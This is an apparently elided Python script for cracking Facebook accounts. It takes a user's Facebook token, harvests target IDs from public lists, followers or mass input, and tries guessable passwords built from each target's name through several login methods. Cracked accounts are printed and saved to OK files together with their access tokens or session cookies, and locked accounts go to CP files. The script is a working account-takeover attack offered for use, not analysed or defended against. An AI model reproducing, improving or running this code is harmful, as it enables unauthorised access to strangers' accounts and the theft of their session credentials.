...
def logo():
	os.system("clear")
	print("""\033[1;97m    __  __                _ _ 
  \033[1;95m / / / /___ _____ ___  (_|_)
\033[1;96m  / /_/ / __ `/ __ `__ \/ / / 
 / __  / /_/ / / / / / / / /  
\033[1;93m/_/ /_/\__,_/_/ /_/ /_/_/_/  \033[1;0m
\033[1;97m--------------------------------------------------
\033[1;93m➤\033[1;95m DEVELOPER   : HAMII X3 WAHAB
\033[1;93m➤\033[1;96m JIGER  : WAHAB X RANA
\033[1;93m➤\033[1;91m WHATSAPP : +923155912839
\033[1;93m➤\033[1;92m  FACEBOOK  :HAMID MEER'HAMII
\033[1;93m➤\033[1;93m LIFE STATUS  :  \033[1;94mSINGLE 
\033[1;97m--------------------------------------------------""")
def login():
	os.system("clear")
	try:
	...
	try:
		...
		logo()
		token = raw_input("\033[1;93m        ➤\033[1;92m ENTER \033[1;96mFACEBOOK  \033[1;95mTOKEN : ")
		if token == "":
			print("Wrong Input")
		try:
...
def menu():
	...
	Hamii = raw_input("\033[1;97m[+]\033[1;91m-⋄-\033[1;97m Option : ")
	if Hamii =="":
		menu()
	elif Hamii == "1" or Hamii == "01":
		publik()
		method()
	elif Hamii == "2" or Hamii == "02":
		follower()
		method()
	elif Hamii == "3" or Hamii == "03":
		massal()
		method()
	elif Hamii == "4" or Hamii == "04":
		print(" ")
		...
		if cek =="":
			...
			menu()
	elif Hamii == "5" or Hamii == "05":
		setting_ua()
	elif Hamii == "0" or Hamii == "00":
		os.system("rm -f login.txt")
...
def method():
	print("\033[1;93m➤\033[1;97m Choose crack method [recommended B-API]")
...
def cek_ttl_cp(uid, pw):
	try:
		...
		with requests.Session() as ses:
			...
			print("\r\033[0;91m[HAMII-CP] %s|%s|%s %s %s\033[0;91m"%(uid, pw, day, month, year))
...
def bapi(user):
	...
	global loop, token
	sys.stdout.write(
		"\r\033[1;93m➤\033[1;96m HAMII CRACKING  \033[1;91m]\033[1;92m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, name = user.split("<=>")
	if len(name)>=6:
	...
	try:
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				print("\r\033[0;92m[HAMII-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "www.facebook.com" in send.json()["error_msg"]:
				print("\r\033[0;91m[HAMII-CP] %s|%s\033[0;92m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
...
def mbasic(user):
	...
	global loop, token
	sys.stdout.write(
		"\r\033[0;91m[\033[0;92mHAMII CRACKING \033[0;92m]\033[0;93m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, name = user.split("<=>")
	if len(name)>=6:
	...
	try:
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;92m[HAMII-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print("\r\033[0;91m[HAMII-CP] %s|%s\033[0;96m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
...
def mobile(user):
	...
	global loop, token
	sys.stdout.write(
		"\r\033[0;91m[\033[0;92mHAMII CRACKING  \033[0;93m]\033[0;95m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, name = user.split("<=>")
	if len(name)>=6:
		pwx = [ name, name+"123", name+"1234", name+"12345" ]
	...
	try:
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print("\r\033[0;92m[HAMII-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print("\r\033[0;91m[HAMII-CP] %s|%s\033[0;91m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
...
def manual():
	...
	def main(user):
		global loop, token
		sys.stdout.write(
			"\r\033[0;92m[\033[0;96mHAMII CRACKING  \033[0;92m]\033[0;96m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid, name = user.split("<=>")
		try:
			for pw in asu:
